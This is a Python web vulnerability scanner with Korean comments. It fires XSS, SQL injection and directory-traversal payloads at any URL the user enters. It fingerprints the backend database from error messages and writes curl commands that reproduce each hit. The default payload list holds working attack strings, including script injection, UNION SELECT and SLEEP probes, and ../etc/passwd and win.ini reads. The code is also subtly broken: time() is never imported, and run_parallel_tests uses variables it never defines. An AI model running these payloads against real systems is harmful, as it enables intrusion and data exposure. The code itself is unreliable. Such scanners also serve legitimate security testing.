import requests
import re
import json
from datetime import datetime
import logging
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# 로깅 설정 (간소화)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class WebVulnTester:
    def __init__(self, target_url, params_info, max_workers=4):
        self.target_url = target_url
        self.params_info = params_info.get(target_url, {"method": "GET", "params": {"q": ""}})
        self.results = []
        self.detected_db = "Unknown"
        self.max_workers = max_workers
        self.results_lock = Lock()  # 결과 리스트 동기화
        
        # 페이로드 JSON 파일 로드
        self.payloads = self.load_payloads()
        
        # sqlmap 스타일 DBMS별 에러 패턴
        self.db_error_patterns = {
            "MySQL": [r"mysql_fetch_array\(\)", r"you have an error in your sql syntax", r"unknown column"],
            "MSSQL": [r"microsoft sql server", r"conversion failed", r"incorrect syntax near"],
            "PostgreSQL": [r"psql error", r"unterminated quoted string", r"current_user"],
            "Oracle": [r"ora-\d{5}", r"invalid identifier", r"from dual"],
            "SQLite": [r"sqlite3.\w+error", r"no such table", r"sqlite_version"],
        }

    def load_payloads(self, file_path="payloads.json"):
        default_payloads = {
            "XSS": [
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                '" onmouseover="alert(1)',
                '"><svg onload=alert(1)>',
                "<script>alert(1337)</script>",
                "javascript:alert(1337)",
                "<img src='x' onerror='alert(1337)'>",
                "<svg/onload=alert(1337)>",
                "'-alert(1337)-'",
                "';alert(1337)//",
                "<xss onafterscriptexecute=alert(1337)>",
                "<input autofocus onfocus=alert(1337)>",
            ],
            "SQLi": {
                "generic": [
                    "' AND SUBSTRING(version(), 1, 1)='5' --",
                    "' AND LENGTH(database()) > 0 --",
                ],
                "MySQL": [
                    "' UNION SELECT 1, user() --",
                    "' OR SLEEP(5) --",  # 시간 기반 페이로드는 유지되지만 탐지 로직에서 제외
                    "' AND IF(LENGTH(database()) > 0, SLEEP(5), 0) --",
                    "' AND SUBSTRING((SELECT database()), 1, 1)='m' --",
                ],
                "MSSQL": [
                    "' UNION SELECT 1, @@version --",
                    "' WAITFOR DELAY '0:0:5' --",
                    "' AND SUBSTRING(DB_NAME(), 1, 1)='m' --",
                ],
                "PostgreSQL": [
                    "' UNION SELECT 1, current_user --",
                    "' AND PG_SLEEP(5) --",
                    "' AND SUBSTRING(current_user, 1, 1)='p' --",
                ],
                "Oracle": [
                    "' UNION SELECT 1, USER FROM dual --",
                    "' AND SUBSTR(USER, 1, 1)='S' --",
                ],
                "SQLite": [
                    "' UNION SELECT 1, sqlite_version() --",
                    "' AND SUBSTR(sqlite_version(), 1, 1)='3' --",
                ]
            },
            "DT": [
                "../etc/passwd",
                "../../../../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "C:\\Windows\\win.ini",
            ]
        }
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        else:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(default_payloads, f, indent=4)
            return default_payloads

    def format_payload_str(self, payload_dict):
        return "; ".join([f"{k}: {v}" for k, v in payload_dict.items()])

    def detect_db(self, response):
        text = response.text.lower() if response.text else ""
        for db, patterns in self.db_error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, text):
                    return db
        return "Unknown"

    def make_request(self, method, params=None, data=None):
        """공통 HTTP 요청 함수 (시간 측정 제거)"""
        session = requests.Session()
        try:
            if method == "GET":
                response = session.get(self.target_url, params=params, timeout=5)
            elif method == "POST":
                response = session.post(self.target_url, data=data, timeout=5)
            else:
                return None
            return response
        except requests.Timeout:
            logging.error(f"Timeout for request at {self.target_url}")
            return None
        except requests.ConnectionError as e:
            logging.error(f"Connection error at {self.target_url}: {e}")
            if not self.target_url.startswith("http://localhost"):
                logging.warning(f"오프라인 환경에서 {self.target_url}에 접근 불가")
            return None
        except requests.RequestException as e:
            logging.error(f"Request failed at {self.target_url}: {e}")
            return None

    def test_vulnerability(self, payload_type, payload_dict, method, params_dict):
        response = self.make_request(method, params=params_dict)
        if not response:
            return None

        payload_str = self.format_payload_str(payload_dict)
        response_text = response.text[:500] if response.text else "[빈 응답]"
        content_type = response.headers.get("Content-Type", "").lower()
        response_size = len(response.text)

        logging.info(f"Payload: {payload_str} | Type: {payload_type} | Method: {method} | URL: {self.target_url} | Status: {response.status_code}")

        result = None
        if payload_type == "XSS":
            xss_patterns = [
                r"alert\((1337|1)\)", r"onerror=['\"]alert\(", r"onload=['\"]alert\(", r"onmouseover=['\"]alert\("
            ]
            for payload in payload_dict.values():
                if payload in response_text or any(re.search(pattern, response_text, re.IGNORECASE) for pattern in xss_patterns):
                    result = f"[!] XSS 취약점 발견: {payload_str} (Method: {method}, Params: {params_dict}, URL: {self.target_url})"
                    break
        elif payload_type == "SQLi":
            error_keywords = ["error", "sql", "syntax", "database", "mysql", "mssql", "postgresql", "oracle", "sqlite"]
            if any(keyword in response_text.lower() for keyword in error_keywords):
                result = f"[!] SQLi 취약점 발견 (에러 기반): {payload_str} (Method: {method}, Params: {params_dict}, URL: {self.target_url})"
        elif payload_type == "DT":
            file_patterns = {"passwd": r"root:[x*]:0:0:", "win.ini": r"\[extensions\]"}
            if "text" in content_type and 50 < response_size < 100000:
                for file, pattern in file_patterns.items():
                    for payload in payload_dict.values():
                        if payload.lower().endswith(file) and re.search(pattern, response_text, re.IGNORECASE):
                            result = f"[!] Directory Traversal 취약점 발견: {payload_str} (탐지된 파일: {file}, Method: {method}, Params: {params_dict}, URL: {self.target_url})"
                            break
                    if result:
                        break

        if result:
            vuln_data = {
                "type": payload_type,
                "payload": payload_str,
                "method": method,
                "url": self.target_url,
                "params": json.dumps(params_dict),
                "status_code": response.status_code,
                "response_snippet": response_text,
                "timestamp": datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S'),
                "reproduce_command": f"curl -X {method} \"{self.target_url}?{'&'.join([f'{k}={v}' for k, v in params_dict.items()])}\" -d \"{'&'.join([f'{k}={v}' for k, v in params_dict.items()])}\"" if method == "POST" else f"curl \"{self.target_url}?{'&'.join([f'{k}={v}' for k, v in params_dict.items()])}\""
            }
            return vuln_data
        return None

    def test_blind_sqli(self, true_payload_dict, false_payload_dict, method, params_true, params_false):
        true_response = self.make_request(method, params=params_true)
        if not true_response:
            return None
        
        false_response = self.make_request(method, params=params_false)
        if not false_response:
            return None

        true_text = true_response.text[:500] if true_response.text else "[빈 응답]"
        false_text = false_response.text[:500] if false_response.text else "[빈 응답]"
        true_size = len(true_response.text)
        false_size = len(false_response.text)

        true_payload_str = self.format_payload_str(true_payload_dict)
        false_payload_str = self.format_payload_str(false_payload_dict)
        logging.info(f"Blind SQLi | True: {true_payload_str} | False: {false_payload_str}")

        if true_text != false_text or abs(true_size - false_size) > 10:  # 시간 기반 조건 제거
            result = f"[!] Blind SQLi 취약점 발견: {true_payload_str} (vs {false_payload_str}, Method: {method}, Params: {params_true}, URL: {self.target_url})"
            vuln_data = {
                "type": "Blind SQLi",
                "payload": true_payload_str,
                "false_payload": false_payload_str,
                "method": method,
                "url": self.target_url,
                "params": json.dumps(params_true),
                "status_code": true_response.status_code,
                "response_snippet": true_text,
                "timestamp": datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S'),
                "reproduce_command": f"curl -X {method} \"{self.target_url}?{'&'.join([f'{k}={v}' for k, v in params_true.items()])}\" -d \"{'&'.join([f'{k}={v}' for k, v in params_true.items()])}\"" if method == "POST" else f"curl \"{self.target_url}?{'&'.join([f'{k}={v}' for k, v in params_true.items()])}\""
            }
            return vuln_data
        return None

    def run_parallel_db_detection(self, method, param_names, generic_payloads):
        def detect_db_task(params_dict):
            response = self.make_request(method, params=params_dict)
            return self.detect_db(response) if response else "Unknown"

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(detect_db_task, {param: generic_payloads[(i + j) % len(generic_payloads)] 
                                                       for j, param in enumerate(param_names)})
                       for i in range(len(generic_payloads))]
            for future in as_completed(futures):
                db = future.result()
                if db != "Unknown":
                    self.detected_db = db
                    print(f"[+] 탐지된 데이터베이스: {self.detected_db}")
                    return True
        return False

    def run_parallel_tests(self, payload_type, payloads, test_func):
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(test_func, payload_type, 
                                      {param: payloads[(i + j) % len(payloads)] for j, param in enumerate(param_names)}, 
                                      method, 
                                      {param: payloads[(i + j) % len(payloads)] for j, param in enumerate(param_names)})
                       for i in range(len(payloads))]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    with self.results_lock:
                        self.results.append(result)
                    print(f"[!] {result['type']} 발견: {result['payload']} (Method: {method})")

    def run_tests(self):
        print(f"\n[+] 테스트 시작: {self.target_url}")
        method = self.params_info["method"]
        param_names = list(self.params_info["params"].keys()) or ["q"]
        print(f"[+] 모든 파라미터 {param_names}에 {method} 메서드 테스트 진행 중...")

        # XSS 테스트
        print(f"[+] XSS 테스트 진행 중...")
        self.run_parallel_tests("XSS", self.payloads["XSS"], self.test_vulnerability)

        # SQLi 테스트 (병렬 DB 탐지)
        print(f"[+] 데이터베이스 탐지 및 SQLi 테스트 진행 중...")
        generic_payloads = self.payloads["SQLi"]["generic"]
        if not self.run_parallel_db_detection(method, param_names, generic_payloads):
            print(f"[!] 데이터베이스 탐지 실패, generic 페이로드로 진행")

        db_key = self.detected_db if self.detected_db in self.payloads["SQLi"] else "generic"
        self.run_parallel_tests("SQLi", self.payloads["SQLi"][db_key], self.test_vulnerability)

        # Blind SQLi 테스트
        print(f"[+] Blind SQLi 테스트 진행 중...")
        blind_payloads = self.payloads["SQLi"][db_key]
        blind_pairs = [(blind_payloads[i], blind_payloads[i+1]) for i in range(0, len(blind_payloads)-1, 2)] or \
                      [(blind_payloads[0], blind_payloads[-1])] if len(blind_payloads) >= 2 else []
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = [executor.submit(self.test_blind_sqli, 
                                      {param: blind_payloads[j % len(blind_payloads)] for j, param in enumerate(param_names)},
                                      {param: blind_payloads[(j + 1) % len(blind_payloads)] for j, param in enumerate(param_names)},
                                      method,
                                      {param: blind_payloads[j % len(blind_payloads)] for j, param in enumerate(param_names)},
                                      {param: blind_payloads[(j + 1) % len(blind_payloads)] for j, param in enumerate(param_names)})
                       for true_base, false_base in blind_pairs]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    with self.results_lock:
                        self.results.append(result)
                    print(f"[!] {result['type']} 발견: {result['payload']} (vs {result['false_payload']}, Method: {method})")

        # DT 테스트
        print(f"[+] Directory Traversal 테스트 진행 중...")
        self.run_parallel_tests("DT", self.payloads["DT"], self.test_vulnerability)

        # 결과 요약
        print(f"\n[+] 테스트 완료: {self.target_url}")
        if self.results:
            print("[!] 발견된 취약점 요약:")
            for result in self.results:
                if result["type"] == "Blind SQLi":
                    print(f"  - {result['type']}: {result['payload']} (vs {result['false_payload']}, {result['method']})")
                else:
                    print(f"  - {result['type']}: {result['payload']} ({result['method']})")
        else:
            print("[+] 취약점이 발견되지 않았습니다.")

def main():
    target_url = input("테스트할 URL을 입력하세요 (예: http://localhost/test): ").strip()
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    params_info = {target_url: {"method": "GET", "params": {"id": "", "name": "", "age": ""}}}
    tester = WebVulnTester(target_url, params_info, max_workers=4)
    tester.run_tests()

if __name__ == "__main__":
    main()
